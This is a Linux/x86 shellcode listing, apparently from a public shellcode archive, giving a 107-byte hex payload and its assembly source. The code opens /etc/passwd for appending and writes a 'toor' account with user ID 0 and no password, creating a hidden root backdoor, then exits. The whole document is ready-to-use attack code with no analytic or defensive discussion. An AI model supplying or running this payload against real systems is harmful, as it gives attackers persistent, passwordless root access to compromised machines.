; Title: Linux/x86 - append /etc/passwd & exit() - 107 bytes
; Author: $andman, n4mdn4s[4T]gmail.com
; Reference: http://shell-storm.org/shellcode/files/shellcode-561.php
; Shellcode: "\xeb\x38\x5e\x31\xc0\x88\x46\x0b\x88\x46\x2b\xc6\x46\x2a\x0a\x8d\x5e\x0c\x89\x5e\x2c\x8d\x1e\x66\xb9\x42\x04\x66\xba\xa4\x01\xb0\x05\xcd\x80\x89\xc3\x31\xd2\x8b\x4e\x2c\xb2\x1f\xb0\x04\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x74\x6f\x6f\x72\x3a\x3a\x30\x3a\x30\x3a\x74\x30\x30\x72\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x23";
; Length: 107 bytes

global _start

section .text

_start:

    jmp short callfunc

func:

    pop esi

    xor eax,eax
    mov [esi+0xb],al
    mov [esi+0x2b],al
    mov byte [esi+0x2a],0xa
    lea ebx,[esi+0xc]
    mov [esi+0x2c],ebx
    lea ebx,[esi]
    mov cx,0x442
    mov dx,0x1a4
    mov al,0x5
    int 0x80

    mov ebx,eax
    xor edx,edx
    mov ecx,[esi+0x2c]
    mov dl,0x1f
    mov al,0x4
    int 0x80

    mov al,0x6
    int 0x80

    mov al,0x1
    xor ebx,ebx
    int 0x80


callfunc:

    call func
    payload: db 0x2F,0x65,0x74,0x63,0x2F,0x70,0x61,0x73,0x73,0x77,0x64,0x23,0x74,0x6F,0x6F,0x72,0x3A,0x3A,0x30,0x3A,0x30,0x3A,0x74,0x30,0x30,0x72,0x3A,0x2F,0x72,0x6F,0x6F,0x74,0x3A,0x2F,0x62,0x69,0x6E,0x2F,0x62,0x61,0x73,0x68,0x20,0x23
